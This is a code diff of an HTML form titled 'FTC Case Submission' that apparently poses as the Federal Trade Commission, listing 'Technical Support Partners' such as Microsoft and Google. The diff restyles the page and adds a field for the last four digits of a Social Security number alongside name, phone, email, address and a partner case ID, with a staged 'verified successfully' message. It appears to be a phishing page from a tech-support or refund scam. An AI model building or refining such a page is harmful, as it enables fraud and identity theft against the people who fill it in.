@@ -5,14 +5,44 @@
   <title>FTC Case Submission</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
-    .form-box { background: white; padding: 20px; max-width: 700px; margin: auto; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    h2 { text-align: center; }
-    input, select, button { width: 100%; padding: 10px; margin-top: 10px; border: 1px solid #ccc; border-radius: 5px; }
+    * { box-sizing: border-box; }
+    body { font-family: 'Segoe UI', sans-serif; background: #e9f0f7; margin: 0; padding: 0; }
+    .form-box {
+      background: white;
+      padding: 20px;
+      max-width: 600px;
+      margin: 40px auto;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+    h2 { text-align: center; color: #123456; margin-bottom: 20px; }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover { background-color: #0056b3; }
     .hidden { display: none; }
-    #partner-logo { height: 50px; display: block; margin: 15px auto; }
-    #loading, #verify-success, #case-details, #identity-section { margin-top: 20px; padding: 15px; background: #eef; border-radius: 5px; }
-    .detail-box { background: #fff; border: 1px solid #ccc; padding: 15px; border-radius: 5px; margin-top: 10px; }
+    .detail-box {
+      background: #f1f9ff;
+      border-left: 4px solid #007bff;
+      padding: 15px;
+      border-radius: 8px;
+      margin-top: 15px;
+    }
+    @media (max-width: 600px) {
+      .form-box { padding: 15px; }
+      input, select, button { font-size: 15px; }
+    }
   </style>
 </head>
 <body>
@@ -22,10 +52,11 @@
     <input type="text" id="lname" placeholder="Last Name">
     <input type="tel" id="phone" placeholder="Phone Number">
     <input type="email" id="email" placeholder="Email Address">
+    <input type="text" id="ssnLast4" placeholder="Last 4 digits of SSN">
     <input type="text" id="address" placeholder="Full Address">
-    <input type="text" id="ftcLast4" placeholder="Last 4 digits of FTC Reference Number">
+    <input type="text" id="zip" placeholder="ZIP Code">
 
-    <select id="partnerSelect" onchange="showPartnerLogo()">
+    <select id="partnerSelect" onchange="showPartnerFields()">
       <option value="">Select Technical Support Partner</option>
       <option value="microsoft">Microsoft</option>
       <option value="google">Google</option>
@@ -35,10 +66,9 @@
       <option value="hp">HP</option>
     </select>
 
-    <img id="partner-logo" class="hidden" src="" alt="Partner Logo">
-
     <input type="text" id="caseId" class="hidden" placeholder="Enter Partner Case ID">
     <button id="verifyBtn" class="hidden" onclick="verifyCaseId()">Verify</button>
+
     <div id="loading" class="hidden">Verifying... please wait.</div>
     <div id="verify-success" class="hidden">✅ Case ID verified successfully.</div>
 
@@ -84,20 +114,9 @@
   </div>
 
   <script>
-    const logos = {
-      microsoft: "https://logo.clearbit.com/microsoft.com",
-      google: "https://logo.clearbit.com/google.com",
-      apple: "https://logo.clearbit.com/apple.com",
-      amazon: "https://logo.clearbit.com/amazon.com",
-      samsung: "https://logo.clearbit.com/samsung.com",
-      hp: "https://logo.clearbit.com/hp.com"
-    };
-
-    function showPartnerLogo() {
+    function showPartnerFields() {
       const partner = document.getElementById("partnerSelect").value;
       if (partner) {
-        document.getElementById("partner-logo").src = logos[partner];
-        document.getElementById("partner-logo").classList.remove("hidden");
         document.getElementById("caseId").classList.remove("hidden");
         document.getElementById("verifyBtn").classList.remove("hidden");
       }
